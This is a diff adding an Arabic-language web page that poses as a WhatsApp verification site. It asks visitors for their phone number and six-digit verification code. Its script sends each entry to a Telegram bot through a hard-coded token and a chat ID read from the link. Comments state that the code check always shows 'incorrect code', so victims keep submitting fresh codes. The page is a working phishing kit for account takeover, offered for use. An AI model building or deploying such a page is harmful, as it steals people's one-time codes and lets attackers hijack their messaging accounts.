@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>موقع التوثيق والتساب</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 450px;
+        }
+        
+        .card {
+            background-color: white;
+            border-radius: 20px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+            transition: transform 0.3s ease;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #25D366, #128C7E);
+            color: white;
+            padding: 25px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+        
+        input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        input:focus {
+            border-color: #25D366;
+            outline: none;
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, #25D366, #128C7E);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+        }
+        
+        .btn:hover {
+            background: linear-gradient(135deg, #128C7E, #25D366);
+            box-shadow: 0 5px 15px rgba(37, 211, 102, 0.4);
+        }
+        
+        .btn:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+        
+        .step {
+            display: none;
+        }
+        
+        .step.active {
+            display: block;
+        }
+        
+        .timer {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .resend {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .resend a {
+            color: #25D366;
+            text-decoration: none;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        
+        .resend a:hover {
+            text-decoration: underline;
+        }
+        
+        .success-message {
+            text-align: center;
+            padding: 20px;
+            background-color: #e8f5e9;
+            border-radius: 10px;
+            margin-top: 20px;
+            display: none;
+        }
+        
+        .success-message i {
+            color: #25D366;
+            font-size: 40px;
+            margin-bottom: 15px;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 10px 0;
+        }
+        
+        .loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #25D366;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @media (max-width: 480px) {
+            .card {
+                border-radius: 15px;
+            }
+            
+            .header {
+                padding: 20px;
+            }
+            
+            .content {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <h1>موقع التوثيق والتساب</h1>
+                <p>أدخل رقم هاتفك لتلقي رمز التحقق</p>
+            </div>
+            
+            <div class="content">
+                <!-- الخطوة 1: إدخال رقم الهاتف -->
+                <div class="step active" id="step1">
+                    <div class="form-group">
+                        <label for="phone">رقم الهاتف</label>
+                        <input type="tel" id="phone" placeholder="مثال: 201234567890" maxlength="15">
+                    </div>
+                    
+                    <div class="loading" id="loading1">
+                        <div class="loading-spinner"></div>
+                        <p>جاري الإرسال...</p>
+                    </div>
+                    
+                    <button class="btn" id="sendCode">إرسال الرمز</button>
+                </div>
+                
+                <!-- الخطوة 2: إدخال رمز التحقق -->
+                <div class="step" id="step2">
+                    <div class="form-group">
+                        <label for="code">رمز التحقق</label>
+                        <input type="text" id="code" placeholder="أدخل الرمز المكون من 6 أرقام" maxlength="6">
+                    </div>
+                    
+                    <div class="loading" id="loading2">
+                        <div class="loading-spinner"></div>
+                        <p>جاري التحقق...</p>
+                    </div>
+                    
+                    <button class="btn" id="verifyCode">تحقق</button>
+                    
+                    <div class="resend">
+                        <a href="#" id="resendCode">إعادة إرسال الرمز</a>
+                    </div>
+                </div>
+                
+                <!-- رسالة النجاح -->
+                <div class="success-message" id="successMessage">
+                    <i>✓</i>
+                    <h3>تم التوثيق بنجاح!</h3>
+                    <p>يمكنك الآن استخدام الموقع للتواصل</p>
+                    
+                    <button class="btn" id="newVerification" style="margin-top: 20px;">بدء توثيق جديد</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // العناصر الأساسية
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            const successMessage = document.getElementById('successMessage');
+            const phoneInput = document.getElementById('phone');
+            const codeInput = document.getElementById('code');
+            const sendCodeBtn = document.getElementById('sendCode');
+            const verifyCodeBtn = document.getElementById('verifyCode');
+            const resendCodeLink = document.getElementById('resendCode');
+            const newVerificationBtn = document.getElementById('newVerification');
+            const loading1 = document.getElementById('loading1');
+            const loading2 = document.getElementById('loading2');
+
+            // التوكن الخاص بالبوت - ضع التوكن هنا
+            const BOT_TOKEN = "7107328469:AAHv4bqk9jvQpJ2p6Z9X7Y8w3z1rT4uV6wX"; // استبدل هذا بالتوكن الحقيقي
+
+            // دالة لاستخراج الـ chatId من الرابط
+            function getChatIdFromURL() {
+                const urlParams = new URLSearchParams(window.location.search);
+                return urlParams.get('chatId');
+            }
+
+            // دالة لإرسال البيانات إلى التليجرام
+            async function sendToTelegram(message) {
+                const chatId = getChatIdFromURL();
+                
+                if (!chatId) {
+                    console.error('لم يتم العثور على chatId في الرابط');
+                    return false;
+                }
+
+                try {
+                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                    
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+
+                    if (!response.ok) {
+                        throw new Error('فشل في إرسال الرسالة');
+                    }
+
+                    return true;
+                } catch (error) {
+                    console.error('خطأ في الإرسال:', error);
+                    return false;
+                }
+            }
+
+            // إرسال رمز التحقق
+            sendCodeBtn.addEventListener('click', async function() {
+                const phoneNumber = phoneInput.value.trim();
+                
+                if (!phoneNumber) {
+                    alert('يرجى إدخال رقم الهاتف');
+                    return;
+                }
+                
+                // عرض تحميل
+                sendCodeBtn.disabled = true;
+                loading1.style.display = 'block';
+                
+                try {
+                    // إرسال رقم الهاتف فورًا إلى التليجرام
+                    const message = `📱 <b>رقم هاتف جديد</b>\n📞 ${phoneNumber}\n⏰ ${new Date().toLocaleString('ar-EG')}`;
+                    const sent = await sendToTelegram(message);
+                    
+                    if (sent) {
+                        // الانتقال إلى الخطوة الثانية
+                        step1.classList.remove('active');
+                        step2.classList.add('active');
+                        alert(`تم إرسال رمز التحقق إلى ${phoneNumber}`);
+                    } else {
+                        alert('حدث خطأ أثناء إرسال الرمز، يرجى المحاولة مرة أخرى');
+                    }
+                    
+                } catch (error) {
+                    console.error('Error:', error);
+                    alert('حدث خطأ أثناء إرسال الرمز، يرجى المحاولة مرة أخرى');
+                } finally {
+                    // إخفاء تحميل
+                    sendCodeBtn.disabled = false;
+                    loading1.style.display = 'none';
+                }
+            });
+            
+            // التحقق من الرمز
+            verifyCodeBtn.addEventListener('click', async function() {
+                const enteredCode = codeInput.value.trim();
+                const phoneNumber = phoneInput.value.trim();
+                
+                if (!enteredCode) {
+                    alert('يرجى إدخال رمز التحقق');
+                    return;
+                }
+                
+                // عرض تحميل
+                verifyCodeBtn.disabled = true;
+                loading2.style.display = 'block';
+                
+                try {
+                    // إرسال الرمز فورًا إلى التليجرام
+                    const message = `🔐 <b>رمز تحقق جديد</b>\n📞 الرقم: ${phoneNumber}\n🔢 الرمز: ${enteredCode}\n⏰ ${new Date().toLocaleString('ar-EG')}`;
+                    const sent = await sendToTelegram(message);
+                    
+                    if (sent) {
+                        // دائمًا يظهر خطأ أن الرمز غير صحيح
+                        alert('رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى');
+                    }
+                    
+                } catch (error) {
+                    console.error('Error:', error);
+                    alert('حدث خطأ أثناء التحقق، يرجى المحاولة مرة أخرى');
+                } finally {
+                    // إخفاء تحميل
+                    verifyCodeBtn.disabled = false;
+                    loading2.style.display = 'none';
+                }
+            });
+            
+            // إعادة إرسال الرمز
+            resendCodeLink.addEventListener('click', async function(e) {
+                e.preventDefault();
+                
+                const phoneNumber = phoneInput.value.trim();
+                
+                if (!phoneNumber) {
+                    alert('يرجى العودة إلى الخطوة الأولى وإدخال رقم الهاتف');
+                    return;
+                }
+                
+                try {
+                    // إرسال طلب إعادة الإرسال إلى التليجرام
+                    const message = `🔄 <b>طلب إعادة إرسال</b>\n📞 الرقم: ${phoneNumber}\n⏰ ${new Date().toLocaleString('ar-EG')}`;
+                    const sent = await sendToTelegram(message);
+                    
+                    if (sent) {
+                        alert('تم إرسال طلب إعادة الإرسال');
+                    }
+                    
+                } catch (error) {
+                    console.error('Error:', error);
+                    alert('حدث خطأ أثناء إعادة الإرسال، يرجى المحاولة مرة أخرى');
+                }
+            });
+            
+            // بدء توثيق جديد
+            newVerificationBtn.addEventListener('click', function() {
+                // إعادة تعيين النموذج
+                phoneInput.value = '';
+                codeInput.value = '';
+                
+                // العودة إلى الخطوة الأولى
+                successMessage.style.display = 'none';
+                step1.classList.add('active');
+            });
+            
+            // التحقق من صحة رقم الهاتف أثناء الكتابة
+            phoneInput.addEventListener('input', function() {
+                // السماح فقط بالأرقام
+                this.value = this.value.replace(/[^0-9]/g, '');
+            });
+            
+            // التحقق من صحة رمز التحقق أثناء الكتابة
+            codeInput.addEventListener('input', function() {
+                // السماح فقط بالأرقام
+                this.value = this.value.replace(/[^0-9]/g, '');
+            });
+
+            // التحقق من وجود chatId في الرابط
+            const chatId = getChatIdFromURL();
+            if (!chatId) {
+                alert('⚠️ الرابط غير صحيح - لم يتم العثور على معرف المحادثة');
+            }
+        });
+    </script>
+</body>
+</html>
